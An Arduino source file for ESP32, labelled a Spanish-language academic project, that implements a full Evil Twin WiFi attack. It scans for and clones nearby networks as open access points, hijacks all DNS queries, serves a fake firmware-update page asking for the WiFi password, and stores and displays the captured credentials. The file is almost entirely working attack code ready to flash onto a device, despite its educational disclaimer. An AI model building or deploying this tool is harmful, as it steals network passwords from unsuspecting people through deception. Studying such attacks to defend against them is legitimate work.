#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <esp_wifi.h>

// =============================================================================
// PROYECTO ACADÉMICO: Portal Evil Twin con Captive Portal para ESP32
// Carrera: Ingeniería en Ciberseguridad
// Institución: Tecnológico de Tapachula
// Creadores: Adalid Santos Cruz e IA
// Propósito: Demostración didáctica de vulnerabilidades en redes WiFi
//            (ataque Evil Twin + Portal Cautivo + DNS Hijacking)
// Licencia de uso: Exclusivamente para fines educativos y de investigación
// =============================================================================

// --- CONFIGURACIÓN ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String bssidStr;
} NetworkInfo;

struct EvilTwinConfig {
  String title = "Se requiere actualización de firmware";
  String subtitle = "MODO DE MANTENIMIENTO DEL SISTEMA";
  String body = "Su dispositivo requiere una actualización crítica de firmware.<br><br>Por favor, introduzca su contraseña de WiFi.";
  String selectedCustomPage = "";
  bool useCustomHTML = false;
};

// --- VARIABLES GLOBALES ---
const byte DNS_PORT = 53;
const char* CRED_FILE = "/creds.txt"; 

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
EvilTwinConfig evilTwinConfig;

String currentEvilTwinSSID = "";
unsigned long lastScan = 0;
// [CORRECCIÓN] Intervalo aumentado para reducir bloqueos, establecer en 0 para desactivar el escaneo automático
const unsigned long SCAN_INTERVAL = 180000; 
bool hotspotActive = false;
const char* ADMIN_AP_SSID = "WiFi_Pentest";
const char* ADMIN_AP_PASS = "password123";

// --- INTERFAZ ADMIN HTML ---
const char HEADER_TEMPLATE[] PROGMEM = R"raw(
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>%TITLE%</title>
  <style>
    :root { --primary: #FF4B2B; --primary-grad: linear-gradient(to right, #FF416C, #FF4B2B); --bg: #F0F2F5; --card-bg: #FFFFFF; --text: #333; }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background: var(--bg); color: var(--text); padding-bottom: 30px; }
    .container { max-width: 800px; margin: 0 auto; padding: 15px; }
    .header { background: var(--primary-grad); color: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(255, 75, 43, 0.3); margin-bottom: 20px; text-align: center; }
    .card { background: var(--card-bg); border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
    h1 { font-size: 1.5rem; margin-bottom: 5px; }
    h2 { font-size: 1.2rem; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
    .btn { display: inline-block; width: 100%; padding: 12px; border: none; border-radius: 8px; background: var(--primary-grad); color: white; font-weight: bold; cursor: pointer; text-decoration: none; margin-bottom: 10px; text-align: center;}
    .btn.secondary { background: #6c757d; } .btn.danger { background: #dc3545; } .btn.success { background: #28a745; }
    input[type="text"], textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px; }
    .table-container { overflow-x: auto; } table { width: 100%; border-collapse: collapse; } th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
    .status-badge { padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; background: #eee; color: black; font-weight: bold; } 
    .active-badge { background: #d4edda; color: #155724; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; }
    .live-dot { height: 10px; width: 10px; background-color: #f00; border-radius: 50%; display: inline-block; animation: blink 1s infinite; margin-right: 5px; }
    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
    .cred-box { background: #fff3cd; border-left: 5px solid #ffc107; padding: 15px; margin-bottom: 10px; word-wrap: break-word; }
    @media (min-width: 600px) { .btn-group { display: flex; gap: 10px; } .btn { margin-bottom: 0; } }
  </style>
</head>
<body><div class="container">
)raw";
const char FOOTER[] PROGMEM = "</div><footer style='text-align:center;margin-top:30px;padding:18px;color:#6c757d;font-size:0.78rem;line-height:1.6;border-top:1px solid #e9ecef;'><strong>Práctica Académica Oficial</strong><br>Carrera de Ingeniería en Ciberseguridad · Tecnológico de Tapachula<br>Creadores: Adalid Santos Cruz e IA · Uso exclusivo con fines educativos y de investigación</footer></body></html>";

// --- UTILIDADES ---
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str; for (uint32_t i = 0; i < size; i++) { if (b[i] < 0x10) str += "0"; str += String(b[i], HEX); if (i < size - 1) str += ":"; } return str;
}
String getCurrentTime() {
  unsigned long t = millis() / 1000; char buf[20]; sprintf(buf, "%02lu:%02lu:%02lu", (t / 3600) % 24, (t / 60) % 60, t % 60); return String(buf);
}

// [CORRECCIÓN] Añadido escapado HTML para prevenir XSS desde contraseñas inyectadas
String htmlEscape(String str) {
  str.replace("&", "&amp;");
  str.replace("<", "&lt;");
  str.replace(">", "&gt;");
  str.replace("\"", "&quot;");
  str.replace("'", "&#39;");
  return str;
}

// --- REGISTRO DE DATOS ---
void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
  File f = SPIFFS.open(CRED_FILE, "a");
  if (f) {
    f.println(getCurrentTime() + " | SSID: " + ssid + " | " + capturedData + " | IP: " + ip);
    f.close();
    Serial.println("✅ Credencial GUARDADA en SPIFFS.");
  } else {
    Serial.println("❌ ERROR: No se pudo escribir en SPIFFS.");
  }
}
String readCredentialsFromSPIFFS() {
  if (!SPIFFS.exists(CRED_FILE)) return "<p>Aún no se han capturado credenciales.</p>";
  File f = SPIFFS.open(CRED_FILE, "r"); String content = "";
  while (f.available()) { 
    String line = f.readStringUntil('\n'); 
    if (line.length() > 0) content = "<div class='cred-box'><strong>" + htmlEscape(line) + "</strong></div>" + content; 
  }
  f.close(); return content;
}
void clearCredentials() { SPIFFS.remove(CRED_FILE); }

// --- SISTEMA DE ARCHIVOS ---
String loadHTMLContent(const String& filename) {
  String filepath = filename.startsWith("/") ? filename : "/" + filename;
  if (SPIFFS.exists(filepath)) { File file = SPIFFS.open(filepath, "r"); if (file) { String c = file.readString(); file.close(); return c; } }
  return "";
}
bool saveHTMLFile(const String& filename, const String& content) {
  String filepath = filename.startsWith("/") ? filename : "/" + filename; if (!filepath.endsWith(".html")) filepath += ".html";
  File file = SPIFFS.open(filepath, "w"); if (!file) return false; file.print(content); file.close(); return true;
}
std::vector<String> getHTMLFiles() {
  std::vector<String> files; File root = SPIFFS.open("/"); File file = root.openNextFile();
  while (file) { String fname = String(file.name()); if (fname.endsWith(".html") || fname.endsWith(".htm")) files.push_back(fname.startsWith("/") ? fname.substring(1) : fname); file = root.openNextFile(); }
  return files;
}

// --- NÚCLEO EVIL TWIN ---
String generateEvilTwinPage() {
  if (evilTwinConfig.useCustomHTML && !evilTwinConfig.selectedCustomPage.isEmpty()) {
    String custom = loadHTMLContent(evilTwinConfig.selectedCustomPage);
    if (!custom.isEmpty()) return custom;
  }
  
  // [CORRECCIÓN] El fallback ahora utiliza correctamente las variables de Configuración del Admin
  String html = R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>%TITLE%</title>
  <style>body{font-family:sans-serif;background:#eee;padding:20px;text-align:center}.box{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
  input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head>
  <body><div class="box"><h2>%SUBTITLE%</h2><p>%BODY%</p>
  <form action="/" method="post"><input type="password" name="password" placeholder="Contraseña WiFi" required><button type="submit">Conectar</button></form></div></body></html>)raw";
  
  html.replace("%TITLE%", evilTwinConfig.title);
  html.replace("%SUBTITLE%", evilTwinConfig.subtitle);
  html.replace("%BODY%", evilTwinConfig.body);
  return html;
}

void performScan() {
  // [CORRECCIÓN] Detener la interferencia del procesamiento DNS y del servidor web no es estrictamente necesario,
  // pero el escaneo bloquea el bucle. Solo tenlo en cuenta.
  int n = WiFi.scanNetworks(false, true); networks.clear();
  if (n > 0) { for (int i = 0; i < n && i < 20; ++i) { NetworkInfo net; net.ssid = WiFi.SSID(i); if (net.ssid.isEmpty()) net.ssid = "[Oculto]"; memcpy(net.bssid, WiFi.BSSID(i), 6); net.ch = WiFi.channel(i); net.bssidStr = bytesToStr(net.bssid, 6); networks.push_back(net); } }
  WiFi.scanDelete();
}

void startEvilTwin() {
  if (selectedNetwork.ssid.isEmpty()) return;

  // [CORRECCIÓN] CRÍTICO: Desconectar STA completamente para liberar la radio y evitar conflictos de canal
  WiFi.disconnect(true, true); 
  delay(500);
  
  WiFi.softAPdisconnect(true); delay(500);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // [MEJORA] Evil Twin SIN contraseña (red abierta = como la mayoría de redes públicas)
  if (WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch)) {
    hotspotActive = true; currentEvilTwinSSID = selectedNetwork.ssid;
    dnsServer.stop(); dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("\n[+] EVIL TWIN INICIADO: " + selectedNetwork.ssid);
    Serial.println("Canal: " + String(selectedNetwork.ch));
    Serial.println("[!] ADMIN: Reconéctate manualmente al SSID '" + selectedNetwork.ssid + "'");
    Serial.println("[!] ADMIN: Luego accede a http://192.168.4.1/admin (NO https)");
  } else { 
    Serial.println("[-] Error al iniciar Evil Twin. Volviendo al AP de Pentest.");
    WiFi.softAP(ADMIN_AP_SSID, ADMIN_AP_PASS); 
  }
}

void stopEvilTwin() {
  hotspotActive = false; dnsServer.stop(); WiFi.softAPdisconnect(true); delay(500);
  WiFi.softAP(ADMIN_AP_SSID, ADMIN_AP_PASS); dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("\n[-] EVIL TWIN DETENIDO");
  Serial.println("[+] AP Admin restaurado: " + String(ADMIN_AP_SSID));
}

// --- PROCESADOR CENTRAL DE CREDENCIALES ---
void processCaptivePortalLogin() {
  String ip = webServer.client().remoteIP().toString();
  String capturedData = "";
  
  for (int i = 0; i < webServer.args(); i++) {
    capturedData += webServer.argName(i) + ": " + webServer.arg(i) + "  ";
  }

  if (capturedData == "" && webServer.hasArg("plain")) {
    capturedData = "CUERPO CRUDO: " + webServer.arg("plain");
  }
  
  if (capturedData == "") capturedData = "[Formato de datos desconocido - Revisar encabezados crudos]";

  Serial.println("\n🔥 CAPTURADO: " + capturedData);
  logCredentialsToSPIFFS(currentEvilTwinSSID, capturedData, ip);

  // [CORRECCIÓN] Redirigir a una página local /success para evitar bucles infinitos de redirección DNS
  webServer.sendHeader("Location", "/success");
  webServer.send(302, "text/plain", "");
}

void handleSuccess() {
  // [CORRECCIÓN] Página de éxito local para que el navegador de la víctima no intente acceder a google.com y generar un bucle
  String html = R"(<html><head><meta http-equiv="refresh" content="5;url=/"></head>
  <body style="text-align:center;font-family:sans-serif;padding:50px;">
  <h1 style="color:green;">Conectado</h1><p>Autenticación exitosa. Ya puede navegar por internet.</p>
  </body></html>)";
  webServer.send(200, "text/html", html);
}

// --- GESTORES DE RUTAS ---
void handleAdmin() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Administración");
  
  html += "<div class='header'><h1>Panel de Administración · Evil Twin ESP32</h1>";
  html += "<p style='margin-top:4px;font-size:0.78rem;color:#8b949e;'>Práctica Académica — Ingeniería en Ciberseguridad · Tecnológico de Tapachula · Creadores: Adalid Santos Cruz e IA</p>";
  if (hotspotActive) html += "<div class='active-badge'>En vivo: " + currentEvilTwinSSID + "</div>"; else html += "<div class='status-badge'>En espera</div>"; html += "</div>";
  
  html += "<div class='card'><h2>Controles</h2><div class='btn-group'>";
  if (hotspotActive) html += "<form method='post' action='/control' style='flex:1'><button name='action' value='stop' class='btn danger'>DETENER</button></form>";
  else html += "<form method='post' action='/control' style='flex:1'><button name='action' value='start' class='btn success'>INICIAR</button></form>";
  html += "<a href='/scan' class='btn secondary' style='flex:1'>Escanear</a></div></div>";

  html += "<div class='card'><h2>Configuración</h2><div class='btn-group'><a href='/config' class='btn secondary' style='flex:1'>Página de Ataque</a><a href='/upload' class='btn secondary' style='flex:1'>Subir HTML</a></div></div>";
  
  html += "<div class='card'><h2>Datos Capturados</h2>" + readCredentialsFromSPIFFS() + "<br><form method='post' action='/clear-logs'><button class='btn danger'>Limpiar</button></form></div>";
  
  if (!networks.empty()) {
    html += "<div class='card'><h2>Redes</h2><div class='table-container'><table><tr><th>SSID</th><th>CH</th><th>Acción</th></tr>";
    for (const auto& net : networks) {
      html += "<tr><td>" + net.ssid + "</td><td>" + String(net.ch) + "</td><td><form method='post' action='/select'><input type='hidden' name='bssid' value='" + net.bssidStr + "'>";
      if (selectedNetwork.bssidStr == net.bssidStr) html += "<button disabled class='btn success'>Seleccionado</button>"; else html += "<button class='btn'>Seleccionar</button>";
      html += "</form></td></tr>";
    }
    html += "</table></div></div>";
  }
  if (hotspotActive) html += "<script>setTimeout(()=>location.reload(),5000);</script>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}

// --- GESTOR MÁGICO: El "Captura-Todo" ---
void handleCaptivePortal() {
  // [MEJORA CRÍTICA] Backdoor de admin: SIEMPRE permite acceder a rutas de admin
  // aunque el Evil Twin esté activo. Resuelve el problema de "no se puede acceder al sitio".
  String uri = webServer.uri();
  if (uri.startsWith("/admin") || uri.startsWith("/config") || uri.startsWith("/control") ||
      uri.startsWith("/scan")  || uri.startsWith("/select") || uri.startsWith("/save")   ||
      uri.startsWith("/upload")|| uri.startsWith("/clear")  || uri.startsWith("/success")) {
    // Redirige al handler correcto via 302 a la ruta exacta (el webServer las tiene registradas)
    webServer.sendHeader("Location", uri);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (!hotspotActive) {
    webServer.sendHeader("Location", "/admin");
    webServer.send(302, "text/plain", ""); 
    return;
  }

  // [CORRECCIÓN] Solo procesar el inicio de sesión si es una petición POST Y contiene argumentos de password/usuario.
  // Esto evita que las POSTs de telemetría en segundo plano de Apple/Google creen registros de falsos positivos.
  if (webServer.method() == HTTP_POST && (webServer.hasArg("password") || webServer.hasArg("user") || webServer.hasArg("email"))) {
    processCaptivePortalLogin();
    return;
  }

  // 2. ESTA ES UNA COMPROBACIÓN DE PORTAL CAUTIVO
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(200, "text/html", generateEvilTwinPage());
}

void handleConfig() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Configuración");
  html += "<div class='card'><h2>Página de Ataque</h2><form method='post' action='/save-config'>";
  html += "<label>Título:</label><input type='text' name='title' value='" + evilTwinConfig.title + "'>";
  html += "<label>Subtítulo:</label><input type='text' name='subtitle' value='" + evilTwinConfig.subtitle + "'>";
  html += "<label>Cuerpo:</label><textarea name='body' rows='3'>" + evilTwinConfig.body + "</textarea>";
  html += "<label>Seleccionar Archivo HTML:</label><select name='html_file'><option value=''>Predeterminado</option>";
  for(const auto& f : getHTMLFiles()) { String sel = (evilTwinConfig.selectedCustomPage == f) ? "selected" : ""; html += "<option value='" + f + "' " + sel + ">" + f + "</option>"; }
  html += "</select><br><br><button class='btn'>Guardar</button></form><br><a href='/admin' class='btn secondary'>Volver</a></div>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}
void handleSaveConfig() {
  if (webServer.hasArg("title")) evilTwinConfig.title = webServer.arg("title");
  if (webServer.hasArg("subtitle")) evilTwinConfig.subtitle = webServer.arg("subtitle");
  if (webServer.hasArg("body")) evilTwinConfig.body = webServer.arg("body");
  String file = webServer.arg("html_file");
  if(file.isEmpty()) { evilTwinConfig.useCustomHTML = false; evilTwinConfig.selectedCustomPage = ""; } else { evilTwinConfig.useCustomHTML = true; evilTwinConfig.selectedCustomPage = file; }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleUpload() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Subir Archivo");
  html += "<div class='card'><h2>Subir HTML</h2><form method='post' action='/save-html'><input type='text' name='filename' placeholder='archivo.html'><textarea name='content' rows='10'></textarea><button class='btn'>Guardar</button></form><br><a href='/admin' class='btn secondary'>Volver</a></div>";
  html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
}
void handleSaveHTML() {
  if(webServer.hasArg("filename") && webServer.hasArg("content")) saveHTMLFile(webServer.arg("filename"), webServer.arg("content"));
  webServer.sendHeader("Location", "/config"); webServer.send(302, "text/plain", "");
}
void handleControl() {
  if (webServer.hasArg("action")) { if (webServer.arg("action") == "start") startEvilTwin(); else stopEvilTwin(); }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleScan() { performScan(); webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }
void handleSelect() {
  String bssid = webServer.arg("bssid"); for (const auto& net : networks) { if (net.bssidStr == bssid) { selectedNetwork = net; break; } }
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}
void handleClearLogs() { clearCredentials(); webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }

// [RUTA DE EMERGENCIA] Si pierdes acceso al admin, navega a: http://192.168.4.1/__UNLOCK__
// detiene el Evil Twin y restaura el AP WiFi_Pentest automáticamente
void handleEmergencyUnlock() {
  if (hotspotActive) { stopEvilTwin(); }
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200); SPIFFS.begin(true);
  
  // [CORRECCIÓN] Se debe establecer el modo Y desconectar para evitar bloqueos de canal
  WiFi.mode(WIFI_AP_STA); 
  WiFi.disconnect(true, true); 
  delay(100);

  // Establecer país en China (CN) o Japón (JP) para habilitar los canales 1-13
  wifi_country_t country = {"CN", 1, 13, WIFI_COUNTRY_POLICY_AUTO};
  esp_wifi_set_country(&country);
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); 
  WiFi.softAP(ADMIN_AP_SSID, ADMIN_AP_PASS);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // RUTAS DE ADMINISTRACIÓN
  webServer.on("/admin", handleAdmin);
  webServer.on("/control", handleControl);
  webServer.on("/scan", handleScan);
  webServer.on("/select", handleSelect);
  webServer.on("/config", handleConfig);
  webServer.on("/save-config", handleSaveConfig);
  webServer.on("/upload", handleUpload);
  webServer.on("/save-html", handleSaveHTML);
  webServer.on("/clear-logs", handleClearLogs);
  
  // [CORRECCIÓN] Añadida ruta de éxito para la redirección posterior al inicio de sesión
  webServer.on("/success", handleSuccess);

  // [RUTA DE EMERGENCIA] Acceso secreto: http://192.168.4.1/__UNLOCK__
  webServer.on("/__UNLOCK__", handleEmergencyUnlock);
  webServer.on("/__admin__", handleAdmin);
  webServer.on("/__stop__", handleEmergencyUnlock);

  // RUTAS DEL PORTAL CAUTIVO
  webServer.on("/", handleCaptivePortal);
  webServer.on("/login", handleCaptivePortal);
  webServer.on("/login.php", handleCaptivePortal);
  webServer.on("/submit", handleCaptivePortal);
  webServer.on("/post", handleCaptivePortal);
  webServer.on("/user", handleCaptivePortal);
  webServer.on("/action", handleCaptivePortal);
  webServer.on("/generate_204", handleCaptivePortal);
  webServer.on("/gen_204", handleCaptivePortal);
  webServer.on("/ncsi.txt", handleCaptivePortal);
  webServer.on("/hotspot-detect.html", handleCaptivePortal);
  
  webServer.onNotFound(handleCaptivePortal);
  
  webServer.begin();
  Serial.println("Servidor iniciado.");
  performScan();
  lastScan = millis();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // [CORRECCIÓN] Solo realizar escaneo automático si Evil Twin NO está activo para evitar congelar el portal cautivo
  if (hotspotActive == false && millis() - lastScan > SCAN_INTERVAL) { 
    performScan(); 
    lastScan = millis(); 
  }
}
